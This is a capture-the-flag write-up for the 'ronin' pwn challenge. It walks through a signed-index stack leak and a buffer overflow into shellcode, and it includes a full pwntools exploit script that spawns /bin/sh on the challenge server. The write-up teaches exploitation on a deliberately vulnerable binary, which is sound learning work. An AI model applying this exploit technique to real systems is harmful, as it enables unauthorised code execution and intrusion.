# ronin (gsemaj)
> A weary samurai makes his way home.

## Exploration
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char* txt[] = {
    "After defeating the great Haku in battle, our hero begins the journey home.\nThe forest is covered in thick brush. It is difficult to see where you are going...\nBut a samurai always knows the way home, and with a sharp sword that can cut through the foliage, there is nothing to worry about.\n...\n...suddenly, the sword is gone. It has been swept straight out of your hand!\nYou look up to see a monkey wielding your sword! What will you do? ",
    "Yes, of course. You are a great warrior! This monkey doesn't stand a chance.\nWith your inner strength, you leap to the trees, chasing the fleeing monkey for what feels like hours.\n",
    "The monkey, with great speed, quickly disappears into the trees. You have lost your sword and any hopes of getting home...\n",
    "Eventually, you lose sight of it. It couldn't have gotten far. Which way will you look? ",
    "Finally, the monkey stops and turns to you.\n\"If you wish for your weapon back, you must make me laugh.\" Holy shit. This monkey can talk. \"Tell me a joke.\" ",
    "\"BAAAAHAHAHAHAHA WOW THAT'S A GOOD ONE. YOU'RE SO FUNNY, SAMURAI.\n...NOT! THAT JOKE SUCKED!\"\nThe monkey proceeds to launch your sword over the trees. The throw was so strong that it disappeard over the horizon.\nWelp. It was a good run.\n",
};

void scroll(char* txt) {
    size_t len = strlen(txt);
    for(size_t i = 0; i < len; i++) {
        char c = txt[i];
        putchar(c);
        usleep((c == '\n' ? 1000 : 50) * 1000);
    }
}

void encounter() {
    while(getchar() != '\n') {}
    scroll(txt[4]);
    char buf2[32];
    fgets(buf2, 49, stdin);
    scroll(txt[5]);
}

void search(char* area, int dir) {
    scroll(area);
    if(dir == 2) {
        encounter();
        exit(0);
    }
}

void chase() {
    char* locs[] = {
        "The treeline ends, and you see beautiful mountains in the distance. No monkey here.\n",
        "Tall, thick trees surround you. You can't see a thing. Best to go back.\n",
        "You found the monkey! You continue your pursuit.\n",
        "You find a clearing with a cute lake, but nothing else. Turning around.\n",
    };
    scroll(txt[3]);
    int dir;
    while(1) {
        scanf("%d", &dir);
        if(dir > 3) {
            printf("Nice try, punk\n");
        } else {
            search(locs[dir], dir);
        }
    }
}

int main() {
    setvbuf(stdout, 0, 2, 0);

    scroll(txt[0]);
    char buf1[80];
    fgets(buf1, 80, stdin);
    if(strncmp("Chase after it.", buf1, 15) == 0) {
        scroll(txt[1]);
        chase();
    } else {
        scroll(txt[2]);
    }
}
```

There are some pretty obvious buffer overflows in here, but before we get ahead of ourselves lets check the binary for some security features. Modern compilers add protections by default and we can easily check them by running `checksec` (provided by `pwntools`) on the binary.

```bash
$ checksec ronin
[*] '/root/ctf/ronin/ronin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Looking pretty exploitable! There is no stack canary, so we can easily jump around wherever we want by buffer overflowing and overwriting the return address of whatever function we're in. RWX enabled means here that the stack is readable writable, and executable. Also, by reading the source code, we can see there is no `win` function to jump to. All of this together means that we will have to write shellcode to execute `/bin/sh`.

## Exploit
We know that we will need to put our shellcode somewhere, so lets find a buffer on the stack with some extra space. In the main function, such a buffer exists, where it reads in 80 bytes, but only needs the first 15. We'll use that to store our shellcode.
```c
fgets(buf1, 80, stdin);
if(strncmp("Chase after it.", buf1, 15) == 0)
    ...
```
```python
shellcode = asm(shellcraft.amd64.linux.sh())
log.info(f"{len(shellcode)=}")  # 48
r.sendline(b'Chase after it.' + shellcode)
```

Where `asm(shellcraft.amd64.linux.sh())` generates the x86_64 assembly instructions as raw bytes to call `execve("/bin/sh")` which would give us a shell. Now we need to jump to it, which is the tricky part.

The location of the stack is randomized on every run, so we will need to leak it. If we can leak some address on the stack, we can calculate the address of our buffer which contains the shellcode, and use that to jump to. The leak occurs in `chase`:

```c
void search(char* area, int dir) {
    scroll(area);
    if(dir == 2) {
        encounter();
        exit(0);
    }
}

void chase() {
    char* locs[] = {
        "The treeline ends, and you see beautiful mountains in the distance. No monkey here.\n",
        "Tall, thick trees surround you. You can't see a thing. Best to go back.\n",
        "You found the monkey! You continue your pursuit.\n",
        "You find a clearing with a cute lake, but nothing else. Turning around.\n",
    };
    scroll(txt[3]);
    int dir;
    while(1) {
        scanf("%d", &dir);
        if(dir > 3) {
            printf("Nice try, punk\n");
        } else {
            search(locs[dir], dir);
        }
    }
}
```

Remember that `scroll` is effectively a `puts` or `printf`. If we can control what is passed to `scroll`, we can print out and leak some information. Notice that `dir` is a value which we control, and that we can run it multiple times, so long as `dir != 2`. We can't access and leak anything past index 3 of `locs`, but `dir` is a *signed* integer. We can negative index `locs` to have a look at some stuff on the stack (since `locs` is also on the stack).

After a couple of segfaults with `locs[-1]`, `locs[-2]`, and `locs[-3]`, it turns out that at `locs[-4]` there is an address to somewhere on the stack, and we can print it out.

```python
r.recvuntil(b'Which way will you look? ')
r.sendline(b'-4')
leak = int.from_bytes(r.recvn(6, timeout=10), 'little')
log.info(f"{leak=:02x}")
```

I have no idea what it is actually pointing to and I don't care. Since I have a leak to a stable address on the stack, I can use gdb to find the offset of this address on the stack to the first byte of the first instruction which is also on the stack. This offset will always be the same.

Now we can set 2 to `dir`, which calls `encounter`, which has a buffer overflow. We can return to the shellcode we placed in the buffer earlier, calculating the address using the offset.
```python
# the offset of the leaked stack address to the beginning of our shellcode
# which is in the earlier buffer
offset = 65
r.sendline(b'2')
r.sendline(b'A'*40 + p64(leak - offset))
```

The full exploit is the following:
```python
from pwn import *

exe = ELF("./ronin")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                set {int}'usleep@plt'=0xc3
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13372)

    return r


def main():
    r = conn()

    shellcode = asm(shellcraft.amd64.linux.sh())
    log.info(f"{len(shellcode)=}")
    r.sendline(b'Chase after it.' + shellcode)

    r.recvuntil(b'Which way will you look? ')
    r.sendline(b'-4')
    leak = int.from_bytes(r.recvn(6, timeout=10), 'little')
    log.info(f"{leak=:02x}")

    # the offset of the leaked stack address to the beginning of our shellcode
    # which is in the earlier buffer
    offset = 65
    r.sendline(b'2')
    r.sendline(b'A'*40 + p64(leak - offset))

    r.interactive()


if __name__ == "__main__":
    main()
```

*running the exploit on the server takes a long time because the scroll function takes a long time to print out all of the text*
```
$ python3 solve.py
[*] '/root/ctf/ronin/ronin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to pwn.chall.pwnoh.io on port 13372: Done
[*] len(shellcode)=48
[*] leak=7ffc31f7f1b0
[*] Switching to interactive mode
You found the monkey! You continue your pursuit.
Finally, the monkey stops and turns to you.
"If you wish for your weapon back, you must make me laugh." Holy shit. This monkey can talk. "Tell me a joke." "BAAAAHAHAHAHAHA WOW THAT'S A GOOD ONE. YOU'RE SO FUNNY, SAMURAI.
...NOT! THAT JOKE SUCKED!"
The monkey proceeds to launch your sword over the trees. The throw was so strong that it disappeard over the horizon.
Welp. It was a good run.
$ ls
flag.txt
ronin
$ cat flag.txt
buckeye{n3v3r_7ru57_4_741k1n9_m0nk3y}
$
[*] Interrupted
[*] Closed connection to pwn.chall.pwnoh.io port 13372
```

## A note on debugging
The `scroll` serves as our `puts` alternative, and otherwise prints a lot of stuff to the screen, but it sleeps for a long time and is a very unpleasant debugging experience. We can use `pwntools` `gdb.attach` to execute a gdb commands on the bianary when we run it which allows us to skip the function. Basically, we set the first instruction of `usleep` to be `0xc3` which is `ret`, so the real underlying function of `usleep` is never called, and `scroll` will print everything immediately without needing to wait so long every time the binary is run.

```python
gdb.attach(r, '''
    set {int}'usleep@plt'=0xc3
    c
''')
```